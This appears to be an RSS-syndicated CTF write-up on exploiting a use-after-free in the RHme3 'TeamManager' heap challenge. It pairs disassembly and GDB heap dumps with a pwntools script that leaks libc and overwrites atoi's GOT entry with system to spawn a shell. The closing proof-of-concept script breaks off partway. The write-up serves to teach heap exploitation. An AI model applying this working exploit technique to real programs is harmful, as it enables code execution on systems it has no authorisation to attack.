<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Heap Exploitation ~ Abusing Use-After-Free</title>
    <link>https://d.clarkee.co.uk/t/heap-exploitation-abusing-use-after-free/3580</link>
    <description>Sup folks! I hope you are all doing great. It&#39;s been a long time since my last CTF write-up. The main reason is because I was trying to master the beast called heap exploitation and I&#39;ve yet to learn a ton about it. To showcase one of the modern ways to pwn a heap-based vulnerable binary, I&#39;ll use a binary that was provided during the RHme3 CTF.

This post might be a shocking example to some of you as to how C/C++ programmers can easily get their binaries pwned in no time if they don&#39;t know what they are doing at the lowest level.

Anyway, RHme3 CTF quals was going on a couple of weeks ago and unfortunately I wasn&#39;t available to play on time so I downloaded the pwnable to mess with it offline. This certain pwnable has to do with heap exploitation, though not really advanced stuff. Knowing that in order to master heap, a write-up is never enough, I&#39;ll link down below some resources I used to make myself familiar with malloc&#39;s / free&#39;s algo. 

In order to make this write-up short and not an entire book, If this is your first time touching on heap internals, you might want to have a look at the references I&#39;ve provided below (I&#39;ll be using them to explain a couple of terms) because I will not go into the theory behind the internals, that&#39;s your job to do. Just keep in mind that heap is no joke (unless you are mentally gifted) and you shouldn&#39;t expect to understand / manipulate it not even within the first 10-20 tries.

* [Glibc Malloc Internals](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
* [Heap Exploitation](https://heap-exploitation.dhavalkapil.com)

Let the fun begin!

---

### _Binary Review_

Let&#39;s start with the all-time classic recon phase, let&#39;s run the binary! 

```makefile
Welcome to your TeamManager (TM)!
0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice:
```

We&#39;re presented with the above menu. In general, most of the heap pwnables regarding CTFs are menu-driven binaries, so after plenty of practice, reverse engineering becomes less and less tedious. 

After messing around with the binary&#39;s funcionality, the conclusions are the following:

* We get to create players in order to form a team. Those players are nothing more than C structs ofcourse. Each player has the following struct attributes.

```
struct player {
     int32_t attack_pts;
     int32_t defense_pts;
     int32_t speed;
     int32_t precision;
     char *name;
}    
```

* We get to show / dump / edit the team&#39;s or the player&#39;s info.

* We get to delete a player from the team.

* Note that in order to do the two aforementioned actions, we need to first **select** the player by entering an idex. Really important info to remember for later.

Alright, enough with the high-level stuff, let&#39;s get dirty with assembly.

---

### _Reverse Engineering_

I&#39;ll be focusing on the core functions of the binary.

#### .: Player Allocation :.

The go-to function for heap pwnables is the one which allocates memory for an object (a player in our case). That&#39;s the one with the juiciest info. Let&#39;s investigate what it does. 

---
_**Tip #1**: Note that we don&#39;t need to reverse engineer the entire binary. The most important part in Reverse Engineering is knowing **what** to reverse. Meaning, most of the analysis will happen dynamically, but it&#39;s wise to get a quick idea of the binary&#39;s internals via static analysis._

---

_**Tip #2**: Most  heap-based binaries need to keep track of the dynamically allocated objects. There&#39;s usually a global array of struct pointers in order to do that. Makes sense, right? That being said, let&#39;s quickly prove this assumption._

---

We have the following two lines of assembly in the beginning of the _addPlayer_ function.


```asm
00401848  mov     rax, qword [rax*8+0x603180]
00401850  test    rax, rax
```

Just those two lines are enough for an exploit-dev person to figure out what this whole function does,  and trust me, the function is big. I know some of you might wanted me to showcase the entire disassembly, but when you have to pwn binaries for 48-hours straight, you have to be crazy fast and effective. So let&#39;s make some more assumptions.

* There&#39;s this interesting address _0x603180_, from which we read its content depending on the value of _rax_. This is classic array indexing. 

* There&#39;s a check against the content of that array value. A check to see if it&#39;s NULL ofcourse. Why though? As I said in tip #2, the program needs to keep track of those allocated player objects. 

* Since it&#39;s an allocation function, it&#39;s pretty likely that it allocates a new player object and stores its pointer into that index depending on the result of the check.

At the end of the function there&#39;s also this line right before it exits:

```asm
00401af8  mov     qword [rax*8+0x603180], rdx
```

It uses again the same indexing method, but this time to **store** in that entry the value _rdx_ holds. I believe it&#39;s safe to assume that the player allocation happens in the following manner:

1. Check if there&#39;s an available entry in the global array for allocation.

2. If the answer to the previous check is yes, ask the user for the player&#39;s info.

3. Once the user is done, store the new allocated player&#39;s address inside the global array.

#### .: Player Selection :.

Coolio, the analysis goes well so far. Before we fire up GDB, let&#39;s check out the function that selects a player. My senses are telling me that there might be a bug there ;)

```asm
00401c8b  mov     eax, dword [rbp-0x14]
00401c8e  mov     rax, qword [rax*8+0x603180]
00401c96  mov     qword [rel selected], rax
```

Once again, from an exploit-dev standpoint, just those 3 lines are more than enough to understand the functionality of the function.

* _eax_ gets the value stored in the local variable at offset _rbp - 0x14_. That&#39;s 100% the index we entered in the prompt.

* _eax_ is indeed used as an index into that global array.

* _rax_ now holds the content (the address of a player&#39;s object in that case) of that array entry and it stores is inside another global variable&#39;s address called _selected_. 

Although the binary is not stripped, the aforementioned conclutions would be as easy to make as if it was stripped.

---

### _Dynamic Analysis_

Enough with the assembly, let&#39;s get the ball rolling! First things first, let&#39;s check out the player allocation in action by stepping through my exploit in GDB. 

---
_**Note:** As I said before, this is not a beginner friendly write-up. If you&#39;re new to heap internals, I strongly advice you to go through the reference links. Although I&#39;ll give a quick overview of some of the internals, to really understand the whys and hows of my exploit, it&#39;s better to have a clear and deep understanding of how the heap **actually** works._
---

```python
def alloc(name, attack = 1, 
		  defense = 2, speed = 3, precision = 4):

	p.recvuntil(&#39;choice: &#39;)
	p.sendline(&#39;1&#39;)

	p.recvuntil(&#39;name: &#39;)
	p.sendline(name)

	p.recvuntil(&#39;points: &#39;)
	p.sendline(str(attack))

	p.recvuntil(&#39;points: &#39;)
	p.sendline(str(defense))

	p.recvuntil(&#39;speed: &#39;)
	p.sendline(str(speed))

	p.recvuntil(&#39;precision: &#39;)
	p.sendline(str(precision))

	return

def pwn():

    alloc(&#39;A&#39;*0x60)

```

```makefile
                              (gdb) x/80gx 0x604000
       actual player chunk --&gt; 0x604000:	0x0000000000000000	0x0000000000000021
Pointer returned by malloc --&gt; 0x604010:	0x0000000200000001	0x0000000400000003
       player&#39;s name chunk --&gt; 0x604020:	0x0000000000604030	0x0000000000000071
                               0x604030:	0x4141414141414141	0x4141414141414141
                               0x604040:	0x4141414141414141	0x4141414141414141
                               0x604050:	0x4141414141414141	0x4141414141414141
                               0x604060:	0x4141414141414141	0x4141414141414141
                               0x604070:	0x4141414141414141	0x4141414141414141
                               0x604080:	0x4141414141414141	0x4141414141414141
                 top chunk --&gt; 0x604090:	0x0000000000000000	0x0000000000020f71
```

Cute, so what do we have here? We allocated a new player. As you can see from the image above, the player object is by default allocated with a size of _0x20_ (the last bit is set in order signify that the previous chunk is in use. Again, check the reference links.) and for its name (of size _0x60_), there&#39;s a malloc pointer pointing to a new allocated chunk which is used just to store its name.

Let&#39;s move on with the next allocation. I&#39;ll start using a more generic naming convention for the player chunks. 

```python
alloc(&#39;B&#39;*0x60)
```

```
(gdb) x/80gx 0x604000
0x604000:	0x0000000000000000	0x0000000000000021  &lt;-- player 0
0x604010:	0x0000000200000001	0x0000000400000003
0x604020:	0x0000000000604030	0x0000000000000071
0x604030:	0x4141414141414141	0x4141414141414141
0x604040:	0x4141414141414141	0x4141414141414141
0x604050:	0x4141414141414141	0x4141414141414141
0x604060:	0x4141414141414141	0x4141414141414141
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x4141414141414141
0x604090:	0x0000000000000000	0x0000000000000021 &lt;-- player 1
0x6040a0:	0x0000000200000001	0x0000000400000003
0x6040b0:	0x00000000006040c0	0x0000000000000071
0x6040c0:	0x4242424242424242	0x4242424242424242
0x6040d0:	0x4242424242424242	0x4242424242424242
0x6040e0:	0x4242424242424242	0x4242424242424242
0x6040f0:	0x4242424242424242	0x4242424242424242
0x604100:	0x4242424242424242	0x4242424242424242
0x604110:	0x4242424242424242	0x4242424242424242
0x604120:	0x0000000000000000	0x0000000000020ee1 &lt;-- top chunk
```

---
_Because the array indexing happens as always from 0, I used **player 0** for the 1st player object and so on. Just an FYI in case you got confused._
---

Let&#39;s finish with the allocations for now.

```python
alloc(&#39;C&#39;*0x80)
alloc(&#39;D&#39;*0x80)
```

```makefile
(gdb) x/90gx 0x604000
0x604000:	0x0000000000000000	0x0000000000000021 &lt;-- player 0
0x604010:	0x0000000200000001	0x0000000400000003
0x604020:	0x0000000000604030	0x0000000000000071
0x604030:	0x4141414141414141	0x4141414141414141
0x604040:	0x4141414141414141	0x4141414141414141
0x604050:	0x4141414141414141	0x4141414141414141
0x604060:	0x4141414141414141	0x4141414141414141
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x4141414141414141
0x604090:	0x0000000000000000	0x0000000000000021 &lt;-- player 1
0x6040a0:	0x0000000200000001	0x0000000400000003
0x6040b0:	0x00000000006040c0	0x0000000000000071
0x6040c0:	0x4242424242424242	0x4242424242424242
0x6040d0:	0x4242424242424242	0x4242424242424242
0x6040e0:	0x4242424242424242	0x4242424242424242
0x6040f0:	0x4242424242424242	0x4242424242424242
0x604100:	0x4242424242424242	0x4242424242424242
0x604110:	0x4242424242424242	0x4242424242424242
0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- player 2
0x604130:	0x0000000200000001	0x0000000400000003
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x4343434343434343	0x4343434343434343
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x0000000000000000	0x0000000000000021 &lt;-- player 3
0x6041e0:	0x0000000200000001	0x0000000400000003
0x6041f0:	0x0000000000604200	0x0000000000000091
0x604200:	0x4444444444444444	0x4444444444444444
0x604210:	0x4444444444444444	0x4444444444444444
0x604220:	0x4444444444444444	0x4444444444444444
0x604230:	0x4444444444444444	0x4444444444444444
0x604240:	0x4444444444444444	0x4444444444444444
0x604250:	0x4444444444444444	0x4444444444444444
0x604260:	0x4444444444444444	0x4444444444444444
0x604270:	0x4444444444444444	0x4444444444444444
0x604280:	0x0000000000000000	0x0000000000020d81 &lt;-- top chunk
```

Here&#39;s a memory view of the global array which holds the player struct pointers:

```makefile
(gdb) x/4gx 0x603180
0x603180 &lt;players&gt;:	    0x0000000000604010	0x00000000006040a0
0x603190 &lt;players+16&gt;:	0x0000000000604130	0x00000000006041e0
```
Sweet, we have officially created our team. Now what? After all, we&#39;re here to pwn! Well, I purposely left out a crucial part of our static recon for this phase of our analysis. 

---

### _UAF Vulnerability_

Heap is all about _malloc_ating memory and _free_-ing memory. However, if _free_-ing isn&#39;t managed correctly, there can be major leaks, all the way up to arbitrary code execution! What do I mean by that? Let&#39;s check out how deleting a player actually happens.

```asm
             [...]
/* index */
00401b9c  mov     eax, dword [rbp-0x1c]
/* player struct pointer */
00401b9f  mov     rax, qword [rax*8+0x603180] 
00401ba7  mov     qword [rbp-0x18], rax
00401bab  mov     eax, dword [rbp-0x1c]
/* Mitigate double-free, good shit */
00401bae  mov     qword [rax*8+0x603180], 0x0 
00401bba  mov     rax, qword [rbp-0x18]
/* player&#39;s name pointer */
00401bbe  mov     rax, qword [rax+0x10]      
00401bc2  mov     rdi, rax
00401bc5  call    free
/* player&#39;s chunk */
00401bca  mov     rax, qword [rbp-0x18]   
00401bce  mov     rdi, rax
00401bd1  call    free
             [...]
```

The player&#39;s name is free&#39;d first and then the player&#39;s chunk itself. But oh my, do you see what I see?! As I mentioned above, when we want to _show_ a player we have to _select_ it beforehand. But, the above assembly snippet doesn&#39;t zero out the global _selected_ variable! This is a major logic bug because that practically means we can **still print** a player&#39;s content even if it&#39;s free! 

This is how the _show_ function works: 

```asm
/* Global variable holding a player pointer */
             [...]
004020f2  mov     rax, qword [rel selected] 
004020f9  mov     rdi, rax
004020fc  call    show_player_func
             [...]
```

As you can see, it receives as an argument the **content** of the _selected_ variable, which is a player struct pointer as we&#39;ll see soon in GDB. If you still don&#39;t understand the vulnerability, don&#39;t worry, I&#39;ll get back to it shortly.

---

### _Heap Theory Crash Course_

In modern systems, ASLR is (and should be) turned on. That being said, in order to get our beloved shell, we need to call system() with _sh_ as its argument. However, we don&#39;t know its address beforehand, but we can leak a certain libc address which will help us calculate its base address and afterwards get the exact location of system()! All of this, thanks to the Use-After-Free vulnerability.

Now before we begin, let me give you a super, duper, uber, quick, high level crash course on how malloc / free handles chunks. I will not spoil the satisfaction of understanding the heap in-depth, so you better do some research afterwards (check the references for details). After a little bit of theory, I&#39;ll provide some visuals as we go through the rest of the exploit.

Malloc manages chunks differently depending on their sizes. Before, I get into that, here&#39;s a beautiful visual of a malloc&#39;d and free&#39;d chunk taken from [here](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_chunk.html). 

---

```makefile
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;                /* double links -- used only if free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

* Malloc&#39;d chunk

```makefile
    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

* Free&#39;d chunk

```makefile
    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:&#39; |             Size of chunk, in bytes                     |A|0|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:&#39; |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

There are 3 core chunk types:

* Fast chunks - Refer to small sized chunks

* Small chunks - Refer to not so small sized chunks

* Large chunks - Refer to quite massive sized chunks

Now, off to the meat of the story.

---
_When a chunk gets free&#39;d, it&#39;s put in a list. That list is either a single-linked list or a circular double-linked list. As you can imagine, not all types of chunks get placed in the same list. Basically, there is the so called fastbin, smallbin, unsorted bin and largebin._
---


#### .: Fast bins :.

There are 10 fast bins. Each of these bins maintains a single linked list. Addition and deletion happen from the front of this list (LIFO). No two adjacent free fast chunks consolidate together.

#### .: Small bins :.

There are 62 small bins. Small bins are faster than large bins but slower than fast bins. Each bin maintains a doubly-linked list. Insertions happen at the **HEAD** while removals happen at the **TAIL** (FIFO). Small chunks may be consolidated together before ending up in unsorted bins.

#### .: Large bins :.

There are 63 large bins. Each bin maintains a doubly-linked list. A particular large bin has chunks of different sizes, sorted in decreasing order (i.e. largest chunk at the **HEAD** and smallest chunk at the **TAIL**). Insertions and removals happen at any position within the list. Large chunks may be coalesced together before ending up in unsorted bins.

#### .: Unsorted bin :.
There is only 1 unsorted bin. Small and large chunks, when freed, end up in this bin. The primary purpose of this bin is to act as a &quot;cache layer&quot; to speed up allocation and deallocation requests.

#### .: Top Chunk :.

It is the chunk which borders the top of an arena. While servicing malloc requests, it is used as the last resort.

---


### _UAF Vulnerability_

Now that we&#39;ve got a visual intuition as to what&#39;s up with the heap, let&#39;s continue with the exploitation part. We&#39;ve got our 4 players allocated, let&#39;s get the damn libc leak.

```python
select(2)

free(2)
```

```makefile
(gdb) x/80gx 0x604000
0x604000:	0x0000000000000000	0x0000000000000021 &lt;-- player 0 [in use]
0x604010:	0x0000000200000001	0x0000000400000003
0x604020:	0x0000000000604030	0x0000000000000071
0x604030:	0x4141414141414141	0x4141414141414141
0x604040:	0x4141414141414141	0x4141414141414141
0x604050:	0x4141414141414141	0x4141414141414141
0x604060:	0x4141414141414141	0x4141414141414141
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x4141414141414141
0x604090:	0x0000000000000000	0x0000000000000021 &lt;-- player 1 [in use]
0x6040a0:	0x0000000200000001	0x0000000400000003
0x6040b0:	0x00000000006040c0	0x0000000000000071
0x6040c0:	0x4242424242424242	0x4242424242424242
0x6040d0:	0x4242424242424242	0x4242424242424242
0x6040e0:	0x4242424242424242	0x4242424242424242
0x6040f0:	0x4242424242424242	0x4242424242424242
0x604100:	0x4242424242424242	0x4242424242424242
0x604110:	0x4242424242424242	0x4242424242424242
0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- player 2 [free]
0x604130:	0x0000000000000000	0x0000000400000003
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8 
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
```

Player 2 is officially free. But something weird happened. You should be able to notice the difference. Its name pointer still points to the same area, but instead of _0x43_ values, there are address there! Libc addresses to be precise! What&#39;s up with those? Let&#39;s separate player 2&#39;s info for a moment and focus on it.

```makefile
0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- player 2 [free]
0x604130:	0x0000000000000000	0x0000000400000003
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x0000000000000090	0x0000000000000020 &lt;-- player 3 [in use]
0x6041e0:	0x0000000200000001	0x0000000400000003
0x6041f0:	0x0000000000604200	0x0000000000000091
```

---
_Note that player 3&#39;s size chunk went from 0x21 to 0x20. That&#39;s how malloc gets to know if a chunk **previous** to the one is currently checking is free or not, by setting the least significant bit to 0. Cool, no?_
---

Libc has a data structure in it, called **main_arena**. This struct stores the **HEAD** and **TAIL** of the bin lists I described above. What do those bin lists are though?

* Fastbins list
```c
typedef struct malloc_chunk *mfastbinptr;
// Array of pointers to chunks
mfastbinptr fastbinsY[];
```
 * Unsorted / small / large bins list:
```c
typedef struct malloc_chunk* mchunkptr;
// Array of pointers to chunks
mchunkptr bins[];
```

In other words, libc keeps track of the allocated chunks by storing their pointers in an array according to their sizes. In reality, each entry is a single / double-linked list which holds a pointer to a different size of chunk. Meaning, the first entry of the fastbin list will point to a free&#39;d chunk of size 16. The second entry of the fastbin list will point to a free&#39;d chunk of size 24 and so on. Same goes for the unsorted / small / large bin. I higly recommend to check out [this](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/) link to get a visual of those lists. I can&#39;t describe it any better than this guy, it&#39;s just awesome.

---
_Note that those bin lists store chunk pointers in their entries as long as they are in the boundaries of their corresponding sizes. As in, a fastbin list can&#39;t point to a chunk that is of small chunk size. I know this might sound confusing but if you look at the link I suggested, it&#39;ll start making sense._
---


Let&#39;s get back to player 2. What happened is that its name pointer points to a chunk of small chunk size. As a result, its _fd_ and _bk_ will be populated with pointers to the previous and next free chunks once it&#39;s free&#39;d. Since this is the first chunk being free&#39;d, both of its pointer point to the exact same location, libc ofcourse.

```
(gdb) heapinfoall 
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x604120 --&gt; 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x604280 (size : 0x20d80) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x604140 (size : 0x90)
```

Looks like I&#39;m not lying. Player&#39;s chunk was indeed put in its corresponding fastbin list and the player&#39;s name chunk was put in the unsorted bin.

Let&#39;s take advantage of the program&#39;s logic in order to leak those libc values (whose offsets from libc&#39;s base are always the same no matter what the base address is).

```makefile
(gdb) x/gx 0x603170
0x603170 &lt;selected&gt;:	0x0000000000604130
```

As you can see above, even though we free&#39;d player 2, its address is still in the _selected_ variable. If we call the _show_ function now, it will read whatever address is in the _selected_ variable, and print its content.


```python
# The &#39;selected&#39; array contains the 3rd player object
# We are abusing the UAF vuln to leak libc
# show_player just checks if the &#39;selected&#39; array is empty
# if it&#39;s not, it will print the value of the player&#39;s object
# without checking if it&#39;s actually free&#39;d or not
show()

p.recvuntil(&#39;Name: &#39;)

leak        = u64(p.recv(6).ljust(8, &#39;\x00&#39;))
libc        = leak - 0x3c17b8
system      = libc + 0x46590

log.info(&quot;Leak:   0x{:x}&quot;.format(leak))
log.info(&quot;Libc:   0x{:x}&quot;.format(libc))
log.info(&quot;system: 0x{:x}&quot;.format(system))
```

```makefile
[*] Leak:   0x7ffff7dd37b8
[*] Libc:   0x7ffff7a12000
[*] system: 0x7ffff7a58590
```

Voila! We successfully leaked the pointer to **main_arena** and got libc&#39;s base address! Let&#39;s pwn the binary once and for all.

---

### _Pwning Time_

Now the question is, how do we get arbitrary code execution? Instead of exploiting the binary&#39;s logic this time, we&#39;ll exploit both the binary&#39;s and heap&#39;s logic. It&#39;s going to get tough, but the brave ones stay with me.

```python
# Consolidate with top chunk
free(3) 
```

```makefile
0x604120:	0x0000000000000000	0x00000000000000b1 &lt;-- player 2 [free]
0x604130:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x00000000000000b0	0x0000000000000020 &lt;-- player 3 [free]
0x6041e0:	0x0000000000000000	0x0000000400000003
0x6041f0:	0x0000000000604200	0x0000000000020e11 &lt;-- top chunk
```

Malloc does not like fragmentation, so what it did was consolidate any adjacent free chunks, update the size values of those chunks according to their coalesced sizes and lastly update the top chunk&#39;s size value to a higher one since chunks were free&#39;d and that means more free space to allocate.

```makefile
(0x20)     fastbin[0]: 0x6041d0 --&gt; 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x6041f0 (size : 0x20e10) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x604120 (size : 0xb0)
```

Now consider the following. What&#39;s going to happen on the next allocation? 

* Remember, each player object has a default size of _0x20_ and a pointer pointing to an arbitrary size chunk depending on the length of our input.

* When we allocate a new chunk, malloc will check the corresponding bin list according to the size request and check if there&#39;s an equivalent free chunk of the same size to serve back to the user. That&#39;s the so called **first-fit behavior**. Keep in mind, deletion and addition in fastbins happens from the **HEAD** of the list. In other words, we should be expecting the player&#39;s info to get stored at _0x6041d0_ since it&#39;s a free chunk of fastbin size and meets the _0x20_ requirement.

* The unsorted bin holds the address _0x604120_. That&#39;s the address of the player 2&#39;s chunk. That was not the same address as before the **free(3)**. That&#39;s because malloc consolidated the adjacent free chunks and they became one entire free chunk, so it had to update the address. The code corresponding to the adjacency check is this:

```
/* consolidate backward */
if (!prev_inuse(p)) {
      prevsize = p-&gt;prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      /* Classic double-linked list unlinking */
      unlink(av, p, bck, fwd);
}
```

* No matter what the size of the name we enter (as long as it&#39;s not bigger than the chunk that is currently in the unsorted bin list, _0xb0_ in our case), we should get back the address _0x604120_ in order to store the name. If the size is less than _0xb0_, the given chunk will get split since there&#39;s no need to give back more than what we ask for, right?

* However, _0x604120_ is the address of player 2&#39;s chunk! Meaning, we can overwrite its data with our surgically picked name payload and mess with its structure. Remember, player 2 is still in the _selected_ variable, so we can still print its content, edit it etc. What if we were able to overwrite the pointer to the original name, with a pointer of our choice (a GOT entry) and call the function _edit_ on it? We would be able to redirect code execution. That&#39;s an abritrary write primitive! Woohoo!

Let&#39;s test our assumptions!

```python
# Overwrite 3rd player&#39;s (index 2) name pointer with atoi
# in order to edit it with system&#39;s address
alloc(&#39;Z&#39;*8 * 2 + p64(atoi_got))

edit(p64(system))
```

The function&#39;s GOT entry I chose to overwrite was _atoi_. The reason for that is that _atoi_ receives a pointer to our input in order to convert it back to an integer. What if _atoi_ is _system_ though? What&#39;s going to happen if we provide _sh_ as an argument to what it&#39;s supposed to be _atoi_? Bingo ;)

```makefile
0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- new player&#39;s name [old player 2]
0x604130:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
0x604140:	0x0000000000603110	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x0000000000000090	0x0000000000000020 &lt;-- new allocated player
0x6041e0:	0x0000000200000001	0x0000000400000003
0x6041f0:	0x0000000000604130
```

Look at that! Look at this beauty! All our assumptions were proven correct! _0x6041d0_ was indeed returned back to us as storage for the new player&#39;s info and _0x604120_ was returned back to us as storage for the player&#39;s name! We succesfully overwrote player&#39;s 2 original name pointer with _atoi_&#39;s GOT entry! With _edit_ we&#39;ll overwrite _atoi&#39;s_ entry with _system&#39;s_ address and once _atoi_ is called in order to convert our input into an integer, it&#39;s game over!

---

### _Exploit / PoC_

```python
from pwn import *

atoi_got = 0x603110

def alloc(name, attack = 1, 
		  defense = 2, speed = 3, precision = 4):

	p.recvuntil(&#39;choice: &#39;)
	p.sendline(&#39;1&#39;)

	p.recvuntil(&#39;name: &#39;)
	p.sendline(name)

	p.recvuntil(&#39;points: &#39;)
	p.sendline(str(attack))

	p.recvuntil(&#39;points: &#39;)
	p.sendline(str(defense))

	p.recvuntil(&#39;speed: &#39;)
	p.sendline(str(speed))

	p.recvuntil(&#39;precision: &#39;)
	p.sendline(str(precision))

	return

def edit(name):

	p.recvuntil(&#39;choice: &#39;)
	p.sendline(&#39;4&#39;)

	p.recvuntil(&#39;choice: &#39;)
	p.sendline(&#39;1&#39;)

	p.recvuntil(&#39;name: &#39;)
	p.sendline(name)

	p.recvuntil(&#39;choice: &#39;)
	p.sendline(&#39;sh&#39;)

	return

def select(idx):

	p.recvuntil(&#39;choice: &#39;)
	p.sendline(&#39;3&#39;)

	p.recvuntil(&#39;index: &#39;)
	p.sendline(str(idx))

	return

def free(idx):

	p.recvuntil(&#39;choice: &#39;)
	p.sendline(&#39;2&#39;)

	p.recvuntil(&#39;index: &#39;)
	p.sendline(str(idx))

	return

def show():

	p.recvuntil(&#39;choice: &#39;)
	p.sendline(&#39;5&#39;)

	return

def pwn():

	alloc(&#39;A&#39;*0x60)
	alloc(&#39;B&#39;*0x60)
	alloc(&#39;C&#39;*0x80)
	alloc(&#39;D&#39;*0x80)

	select(2)

	free(2)

